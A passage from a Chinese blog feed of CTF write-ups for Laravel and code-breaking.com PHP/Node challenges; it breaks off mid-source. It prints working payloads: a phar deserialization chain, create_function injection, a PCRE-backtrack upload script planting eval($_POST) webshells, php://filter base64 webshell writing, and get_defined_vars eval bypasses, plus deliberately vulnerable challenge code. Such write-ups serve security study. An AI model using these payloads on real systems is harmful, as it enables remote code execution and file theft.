class="string">'dispatch'</span>=&gt;<span class="keyword">array</span>($obj_2, <span class="string">'invoke'</span>));</span><br><span class="line">$obj_4 = <span class="keyword">new</span> Faker\Generator($obj_3);</span><br><span class="line">$obj = <span class="keyword">new</span> Illuminate\Broadcasting\PendingBroadcast($obj_4, $obj_1);</span><br><span class="line">$p = <span class="keyword">new</span> Phar(<span class="string">'2.phar'</span>, <span class="number">0</span>);</span><br><span class="line">$p-&gt;startBuffering();</span><br><span class="line">$p-&gt;setStub(<span class="string">'GIF89a&lt;?php __HALT_COMPILER(); ?&gt;'</span>);</span><br><span class="line">$p-&gt;setMetadata($obj);</span><br><span class="line">$p-&gt;addFromString(<span class="string">'2.txt'</span>, <span class="string">'text'</span>);</span><br><span class="line">$p-&gt;stopBuffering();</span><br><span class="line">rename(<span class="string">'2.phar'</span>, <span class="string">'2.gif'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>同样上传之后执行一下上面类似的语句就触发执行生成webshell，然后就拿flag。</p><p><code>http://51.158.73.123:8080/upload/image/618.php?618=var_dump(glob(%27/var/www/*%27));</code></p><p><code>http://51.158.73.123:8080/upload/image/618.php?618=var_dump(file_get_contents(%27/var/www/flag_larave1_b0ne%27));</code></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="http://www.venenof.com/live_CTF%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B.pdf" target="_blank" rel="noopener">http://www.venenof.com/live_CTF%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B.pdf</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;题目分析&quot;&gt;&lt;a href=&quot;#题目分析&quot; class=&quot;headerlink&quot; title=&quot;题目分析&quot;&gt;&lt;/a&gt;题目分析&lt;/h2&gt;&lt;p&gt;php的laravel框架的审计题目。这里记录一下复现过程。整体思路是venenof7师傅的。&lt;/p&gt;
&lt;p&gt;先来看入口，不
      
    
    </summary>
    
      <category term="技术" scheme="https://hurricane618.me/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="CTF" scheme="https://hurricane618.me/tags/CTF/"/>
    
      <category term="代码审计" scheme="https://hurricane618.me/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>code-breaking easy部分题目writeup</title>
    <link href="https://hurricane618.me/2019/01/10/code-breaking-esay-wp/"/>
    <id>https://hurricane618.me/2019/01/10/code-breaking-esay-wp/</id>
    <published>2019-01-10T06:02:10.000Z</published>
    <updated>2019-01-10T06:45:54.000Z</updated>
    
    <content type="html"><![CDATA[<p>ph师傅的代码审计CTF题目 <code>https://code-breaking.com</code></p><h2 id="easy-function"><a href="#easy-function" class="headerlink" title="easy - function"></a>easy - function</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$action = $_GET[<span class="string">'action'</span>] ?? <span class="string">''</span>;$arg = $_GET[<span class="string">'arg'</span>] ?? <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/^[a-z0-9_]*$/isD'</span>, $action)) &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $action(<span class="string">''</span>, $arg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>观察正则表达式可以发现正常的函数名都不行，所以很容易联想到要在函数名中加入其它字符，这道题没想到可以用<code>create_function</code>，一开始一直在想命令执行的函数，但是没有符合要求的……</p><p>想到<code>create_function</code>之后，要测试哪个字符可以使用，这里有师傅用了burp测试函数是<code>var_dump</code>来fuzz，最后fuzz出了<code>%5c</code>，就是<code>\</code>。在小密圈中师傅的解释是PHP的命名空间默认为<code>\</code> ，如果直接写<code>function_name()</code>调用相当于是用相对路径在调用函数，如果写成<code>\function_name()</code>相当于用绝对路径调用函数。如果你在其他namespace里调用系统类，就必须写绝对路径这种写法。</p><p>如何在create_function中执行代码呢？<code>http://blog.51cto.com/lovexm/1743442</code></p><p>这篇文章中介绍了在create_function中如何注入代码并且执行。简单来说是通过输入<code>}</code>来闭合函数，之后再注入我们想执行的代码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$b = create_function(<span class="string">'$a'</span>, <span class="string">"return 666;"</span>);</span><br><span class="line"><span class="keyword">echo</span> $b;<span class="comment">//lambda_xxx</span></span><br><span class="line">$b(<span class="number">1</span>)<span class="comment">//return 666</span></span><br><span class="line"></span><br><span class="line">这个匿名函数等效于</span><br><span class="line">lambda_xxx($a)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">666</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">如果注入&#125;</span><br><span class="line">lambda_xxx($a)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">666</span>;&#125;<span class="keyword">eval</span>(<span class="string">"phpinfo()"</span>);<span class="comment">/*</span></span><br><span class="line"><span class="comment">这样在创建匿名函数的同时会执行我们的恶意代码，这里/* 和//都是可以的</span></span><br></pre></td></tr></table></figure><p>现在能够执行代码了，剩下的就是通过执行代码寻找flag。这里套用一下LoRexxar的payload来搜索文件</p><p><code>http://51.158.75.42:8087/?action=%5ccreate_function&amp;arg=return%20666;}eval($_POST[%27618%27]);/*</code></p><p><code>618=$handle = opendir(&#39;../&#39;);while(($filename = readdir($handle)) !== false){echo $filename.&quot;&lt;br/&gt;&quot;;}</code></p><img src="/2019/01/10/code-breaking-esay-wp/1.png"><p>这样直接file_get_contents获取内容</p><p><code>618=print(file_get_contents(&#39;../flag_h0w2execute_arb1trary_c0de&#39;));</code></p><h2 id="easy-pcrewaf"><a href="#easy-pcrewaf" class="headerlink" title="easy - pcrewaf"></a>easy - pcrewaf</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_php</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_match(<span class="string">'/&lt;\?.*[(`;?&gt;].*/is'</span>, $data);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($_FILES)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(show_source(<span class="keyword">__FILE__</span>));</span><br><span class="line">&#125;$user_dir = <span class="string">'data/'</span> . md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);$data = file_get_contents($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>]);</span><br><span class="line"><span class="keyword">if</span> (is_php($data)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"bad request"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    @mkdir($user_dir, <span class="number">0755</span>);</span><br><span class="line">    $path = $user_dir . <span class="string">'/'</span> . random_int(<span class="number">0</span>, <span class="number">10</span>) . <span class="string">'.php'</span>;</span><br><span class="line">    move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>], $path);</span><br><span class="line">    header(<span class="string">"Location: $path"</span>, <span class="keyword">true</span>, <span class="number">303</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先，文件内容不能有<code>&lt;?</code>，这样就意味着正常的php文件完全gg，然后也可以看到文件名不可控，这就是说没有办法用文件名传输php数据。这道题参考了ph师傅的方法。</p><p>ph师傅的方法是利用了php正则表达式的一个特性，一般的语言在正则表达式匹配的时候会有回溯操作，比如在贪婪或者非贪婪模式下，一开始匹配的内容会为最大匹配，之后会根据正则表达式的内容进行回溯调整。然而php有一个回溯的次数限制，如果超过这个限制正则表达式就会返回false，又由于php的弱类型比较，这样就会绕过if的判断。</p><p>这里有鸟哥的一篇文章介绍php正则匹配的回溯限制</p><p><a href="http://www.laruence.com/2010/06/08/1579.html" target="_blank" rel="noopener">http://www.laruence.com/2010/06/08/1579.html</a></p><p>ph师傅的详细内容</p><p><a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html</a></p><p>这里在上传的文件中加入1000000个a就会超过回溯的次数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requestsimport iosession = requests.session()</span><br><span class="line">agent = <span class="string">'Mozilla/5.0 (compatible; MSIE 10.0; Windows Phone 8.0; Trident/6.0; IEMobile/10.0; ARM;'</span> \</span><br><span class="line"><span class="string">' Touch; NOKIA; Lumia 920)'</span></span><br><span class="line">headers = &#123;   </span><br><span class="line"><span class="string">"Host"</span>: <span class="string">"51.158.75.42:8088"</span>,    </span><br><span class="line"><span class="string">"User-Agent"</span>: agent,    </span><br><span class="line"><span class="string">"Origin"</span>: <span class="string">"https://code-breaking.com/"</span>,</span><br><span class="line">&#125;</span><br><span class="line">files = &#123; </span><br><span class="line"><span class="string">'file'</span>: io.BytesIO(<span class="string">b'aaa&lt;?php eval($_POST[txt]);//'</span> + <span class="string">b'a'</span> * <span class="number">1000000</span>)</span><br><span class="line">&#125;</span><br><span class="line">html = session.post(<span class="string">'http://51.158.75.42:8088/'</span>, headers=headers, files=files, allow_redirects=<span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">print</span> html.headers</span><br></pre></td></tr></table></figure><p>然后根据打印出来的头部信息，得到webshell的地址 <code>data/558cb3b807e236696e9e2c79295d7fee/1.php</code>，然后构造post数据执行代码，拿flag。</p><p><code>txt=$handler = opendir(&#39;../../../&#39;);while(($filename = readdir($handler)) !== flase){echo $filename.&quot;&lt;br/&gt;&quot;;}</code></p><p><code>txt=print(file_get_contents(&#39;../../../flag_php7_2_1s_c0rrect&#39;));</code></p><h2 id="easy-phpmagic"><a href="#easy-phpmagic" class="headerlink" title="easy - phpmagic"></a>easy - phpmagic</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'read-source'</span>])) &#123;</span><br><span class="line">    <span class="keyword">exit</span>(show_source(<span class="keyword">__FILE__</span>));</span><br><span class="line">&#125;define(<span class="string">'DATA_DIR'</span>, dirname(<span class="keyword">__FILE__</span>) . <span class="string">'/data/'</span> . md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]));</span><br><span class="line"><span class="keyword">if</span>(!is_dir(DATA_DIR)) &#123;</span><br><span class="line">    mkdir(DATA_DIR, <span class="number">0755</span>, <span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">chdir(DATA_DIR);</span><br><span class="line">$domain = <span class="keyword">isset</span>($_POST[<span class="string">'domain'</span>]) ? $_POST[<span class="string">'domain'</span>] : <span class="string">''</span>;</span><br><span class="line">$log_name = <span class="keyword">isset</span>($_POST[<span class="string">'log'</span>]) ? $_POST[<span class="string">'log'</span>] : date(<span class="string">'-Y-m-d'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html lang=<span class="string">"en"</span>&gt;</span><br><span class="line">&lt;head&gt;    </span><br><span class="line">&lt;!-- Required meta tags --&gt;   </span><br><span class="line">&lt;meta charset=<span class="string">"utf-8"</span>&gt;    </span><br><span class="line">&lt;meta name=<span class="string">"viewport"</span> content=<span class="string">"width=device-width, initial-scale=1, shrink-to-fit=no"</span>&gt;    </span><br><span class="line">&lt;!-- Bootstrap CSS --&gt;    </span><br><span class="line">&lt;link rel=<span class="string">"stylesheet"</span> href=<span class="string">"https://cdn.jsdelivr.net/npm/bootstrap@4.1.3/dist/css/bootstrap.min.css"</span> integrity=<span class="string">"sha256-eSi1q2PG6J7g7ib17yAaWMcrr5GrtohYChqibrV7PBE="</span> crossorigin=<span class="string">"anonymous"</span>&gt;</span><br><span class="line">&lt;title&gt;Domain Detail&lt;/title&gt;   </span><br><span class="line">&lt;style&gt;    pre &#123;        </span><br><span class="line">width: <span class="number">100</span>%;        </span><br><span class="line">background-color: <span class="comment">#f6f8fa;        </span></span><br><span class="line">border-radius: <span class="number">3</span>px;        </span><br><span class="line">font-size: <span class="number">85</span>%;       </span><br><span class="line">line-height: <span class="number">1.45</span>;       </span><br><span class="line">overflow: auto;       </span><br><span class="line">padding: <span class="number">16</span>px;        </span><br><span class="line">border: <span class="number">1</span>px solid <span class="comment">#ced4da;    </span></span><br><span class="line">&#125;    </span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;&lt;div class="container"&gt;    </span><br><span class="line">&lt;div class="row"&gt;        </span><br><span class="line">&lt;div class="col"&gt;            </span><br><span class="line">&lt;form method=<span class="string">"post"</span>&gt;                </span><br><span class="line">&lt;div class="input-group mt-3"&gt;                    </span><br><span class="line">&lt;div class="input-group-prepend"&gt;                        </span><br><span class="line">&lt;span class="input-group-text" id="basic-addon1"&gt;dig -t A -q&lt;/span&gt;                    </span><br><span class="line">&lt;/div&gt;                    </span><br><span class="line">&lt;input type="text" name="domain" class="form-control" placeholder="Your domain"&gt;                    </span><br><span class="line">&lt;div class="input-group-append"&gt;                        </span><br><span class="line">&lt;button class="btn btn-outline-secondary" type="submit"&gt;执行&lt;/button&gt;                    </span><br><span class="line">&lt;/div&gt;               </span><br><span class="line">&lt;/div&gt;            </span><br><span class="line">&lt;/form&gt;        </span><br><span class="line">&lt;/div&gt;        </span><br><span class="line">&lt;/div&gt;   </span><br><span class="line">&lt;div class="row"&gt;        </span><br><span class="line">&lt;div class="col"&gt;            </span><br><span class="line">&lt;pre class="mt-3"&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST) &amp;&amp; $domain):</span><br><span class="line">                $command = sprintf(<span class="string">"dig -t A -q %s"</span>, escapeshellarg($domain));</span><br><span class="line">                $output = shell_exec($command);</span><br><span class="line">                $output = htmlspecialchars($output, ENT_HTML401 | ENT_QUOTES);</span><br><span class="line">                $log_name = $_SERVER[<span class="string">'SERVER_NAME'</span>] . $log_name;</span><br><span class="line">                <span class="keyword">if</span>(!in_array(pathinfo($log_name, PATHINFO_EXTENSION), [<span class="string">'php'</span>, <span class="string">'php3'</span>, <span class="string">'php4'</span>, <span class="string">'php5'</span>, <span class="string">'phtml'</span>, <span class="string">'pht'</span>], <span class="keyword">true</span>)) &#123;</span><br><span class="line">                    file_put_contents($log_name, $output);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">echo</span> $output;</span><br><span class="line">            <span class="keyword">endif</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    &lt;/pre&gt;        </span><br><span class="line">            &lt;/div&gt;   </span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">            &lt;/body&gt;</span><br><span class="line">            &lt;/html&gt;</span><br></pre></td></tr></table></figure><p>首先还是来看可控点，一个是域名可控，一个是文件名部分可控。然而这里有<code>escapeshellarg</code>导致我们的输入被默认成字符串，没有办法注入命令，所以只能执行域名解析。这里参考fish师傅的方法，这里最需要注意的是<code>file_get_contents</code>，这种文件操作经过blackhat的议题，可以知道都是可以操作php协议流的。而这里是将域名解析的输出写入一个日志中，所以基本思路就是利用php://filter将我们的base64编码的数据解码输入进日志文件中。</p><p>关于文件名的后缀问题，<code>http://wonderkun.cc/index.html/?p=626</code> 这篇文章中知道在文件路径中包含<code>/.</code>或者<code>/../</code>会导致pathinfo无法获取到后缀名，这样就绕过后缀判断，写入php文件。之后的问题域名解析的输出只有一部分是可控的，这里有一个要点就是base64会忽视不符合要求的特殊字符，然后会以4个字符为一组解码字符，所以只要前面的数据为4的倍数就能正确执行。其次由于我们的输入点在数据的中间部分，所以也不能有<code>=</code>符号。</p><p>这里写入文件有一个重要的点，通过上面的这种特殊路径写入的文件只能创建新的文件，无法覆盖原来的旧文件。这点很重要，我就白忙活了半个小时……</p><p>最后，这个文件名其中有一部分是server_name，这里的值是获取的客户端请求的host值，因为在使用php流的时候会包含php，这里就可以把php放入host值中。</p><img src="/2019/01/10/code-breaking-esay-wp/2.png"><p>其中base64编码下面的webshell</p><p><code>&lt;?php @eval($_POST[&#39;618&#39;]); ?&gt;</code></p><p><code>PD9waHAgQGV2YWwoJF9QT1NUWyc2MTgnXSk7Pz4</code></p><p>最后我们在<code>http://51.158.75.42:8082/data/558cb3b807e236696e9e2c79295d7fee/x618.php</code>执行代码就可以获取flag了。</p><p><code>618=var_dump(glob(&quot;/var/www/*&quot;));</code></p><p><code>618=var_dump(file_get_contents(&#39;/var/www/flag_phpmag1c_ur1&#39;));</code></p><h2 id="easy-phplimit"><a href="#easy-phplimit" class="headerlink" title="easy - phplimit"></a>easy - phplimit</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span><span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[^\W]+\((?R)?\)/'</span>, <span class="string">''</span>, $_GET[<span class="string">'code'</span>])) &#123;    </span><br><span class="line">    <span class="keyword">eval</span>($_GET[<span class="string">'code'</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这是一道老题，通过正则表达式我们可以知道，这个code只能执行嵌套的函数，例如<code>abc(def())</code>这种，这里的思路就是利用http的header来传输payload，利用php的获取header的函数，再eval执行，就变成了任意代码执行。</p><p><code>?code=current(getallheaders());</code></p><p>但是，WTF，这是nginx的服务器，没有apache的相关函数，找了半天无功而返…… 找了找fish师傅的wp，他是利用了<code>get_defined_vars</code> 函数获取定义的变量，但是有很多变量我们不可控怎么办？这里有一个 <code>reset()</code> 操作把之前的变量全部重置。所以变量就只剩下我们传输的get参数，这样我们直接把payload放在get请求中，用implode全部取出，然后拼接// 注释掉后面的部分，又变成了任意代码执行了。</p><p><code>http://51.158.75.42:8084/?1=var_dump(glob(%27/var/www/*%27));//&amp;code=eval(implode(reset(get_defined_vars())));</code></p><p>而这里两次eval，第一次eval是把变量重置之后全部提取出来，提取出来的字符串值再次eval，才会执行我们前面的代码。</p><p><code>http://51.158.75.42:8084/?1=var_dump(file_get_contents(%27/var/www/flag_phpbyp4ss%27));//&amp;code=eval(implode(reset(get_defined_vars())));</code></p><p>这里也可以是其他的payload，都是大同小异。</p><p><code>?code=eval(next(current(get_defined_vars())));&amp;b=var_dump(glob(%27/var/www/*%27));</code></p><p>另外一种思路是嵌套使用函数搜索目录读取文件。</p><p><code>code=readfile(next(array_reverse(scandir(dirname(chdir(dirname(getcwd())))))));</code></p><h2 id="easy-nodechr"><a href="#easy-nodechr" class="headerlink" title="easy - nodechr"></a>easy - nodechr</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// initial libraries</span></span><br><span class="line"><span class="keyword">const</span> Koa = <span class="built_in">require</span>(<span class="string">'koa'</span>)</span><br><span class="line"><span class="keyword">const</span> sqlite = <span class="built_in">require</span>(<span class="string">'sqlite'</span>)</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>)</span><br><span class="line"><span class="keyword">const</span> views = <span class="built_in">require</span>(<span class="string">'koa-views'</span>)</span><br><span class="line"><span class="keyword">const</span> Router = <span class="built_in">require</span>(<span class="string">'koa-router'</span>)</span><br><span class="line"><span class="keyword">const</span> send = <span class="built_in">require</span>(<span class="string">'koa-send'</span>)</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">'koa-bodyparser'</span>)</span><br><span class="line"><span class="keyword">const</span> session = <span class="built_in">require</span>(<span class="string">'koa-session'</span>)</span><br><span class="line"><span class="keyword">const</span> isString = <span class="built_in">require</span>(<span class="string">'underscore'</span>).isString</span><br><span class="line"><span class="keyword">const</span> basename = <span class="built_in">require</span>(<span class="string">'path'</span>).basename</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> config = <span class="built_in">JSON</span>.parse(fs.readFileSync(<span class="string">'../config.json'</span>, &#123;<span class="attr">encoding</span>: <span class="string">'utf-8'</span>, <span class="attr">flag</span>: <span class="string">'r'</span>&#125;))</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> app = <span class="keyword">new</span> Koa()</span><br><span class="line">    <span class="keyword">const</span> router = <span class="keyword">new</span> Router()</span><br><span class="line">    <span class="keyword">const</span> db = <span class="keyword">await</span> sqlite.open(<span class="string">':memory:'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">await</span> db.exec(<span class="string">`CREATE TABLE "main"."users" (</span></span><br><span class="line"><span class="string">        "id" INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT,</span></span><br><span class="line"><span class="string">        "username" TEXT NOT NULL,</span></span><br><span class="line"><span class="string">        "password" TEXT,</span></span><br><span class="line"><span class="string">        CONSTRAINT "unique_username" UNIQUE ("username")</span></span><br><span class="line"><span class="string">    )`</span>)</span><br><span class="line">    <span class="keyword">await</span> db.exec(<span class="string">`CREATE TABLE "main"."flags" (</span></span><br><span class="line"><span class="string">        "id" INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT,</span></span><br><span class="line"><span class="string">        "flag" TEXT NOT NULL</span></span><br><span class="line"><span class="string">    )`</span>)</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> user <span class="keyword">of</span> config.users) &#123;</span><br><span class="line">        <span class="keyword">await</span> db.run(<span class="string">`INSERT INTO "users"("username", "password") VALUES ('<span class="subst">$&#123;user.username&#125;</span>', '<span class="subst">$&#123;user.password&#125;</span>')`</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">await</span> db.run(<span class="string">`INSERT INTO "flags"("flag") VALUES ('<span class="subst">$&#123;config.flag&#125;</span>')`</span>)</span><br><span class="line"></span><br><span class="line">    router.all(<span class="string">'login'</span>, <span class="string">'/login/'</span>, login).get(<span class="string">'admin'</span>, <span class="string">'/'</span>, admin).get(<span class="string">'static'</span>, <span class="string">'/static/:path(.+)'</span>, <span class="keyword">static</span>).get(<span class="string">'/source'</span>, source)</span><br><span class="line"></span><br><span class="line">    app.use(views(__dirname + <span class="string">'/views'</span>, &#123;</span><br><span class="line">        map: &#123;</span><br><span class="line">            html: <span class="string">'underscore'</span></span><br><span class="line">        &#125;,</span><br><span class="line">        extension: <span class="string">'html'</span></span><br><span class="line">    &#125;)).use(bodyParser()).use(session(app))</span><br><span class="line">    </span><br><span class="line">    app.use(router.routes()).use(router.allowedMethods());</span><br><span class="line">    </span><br><span class="line">    app.keys = config.signed</span><br><span class="line">    app.context.db = db</span><br><span class="line">    app.context.router = router</span><br><span class="line">    app.listen(<span class="number">3000</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safeKeyword</span>(<span class="params">keyword</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(isString(keyword) &amp;&amp; !keyword.match(<span class="regexp">/(union|select|;|\-\-)/i</span>s)) &#123;</span><br><span class="line">        <span class="keyword">return</span> keyword</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">undefined</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params">ctx, next</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(ctx.method == <span class="string">'POST'</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> username = safeKeyword(ctx.request.body[<span class="string">'username'</span>])</span><br><span class="line">        <span class="keyword">let</span> password = safeKeyword(ctx.request.body[<span class="string">'password'</span>])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> jump = ctx.router.url(<span class="string">'login'</span>)</span><br><span class="line">        <span class="keyword">if</span> (username &amp;&amp; password) &#123;</span><br><span class="line">            <span class="keyword">let</span> user = <span class="keyword">await</span> ctx.db.get(<span class="string">`SELECT * FROM "users" WHERE "username" = '<span class="subst">$&#123;username.toUpperCase()&#125;</span>' AND "password" = '<span class="subst">$&#123;password.toUpperCase()&#125;</span>'`</span>)</span><br><span 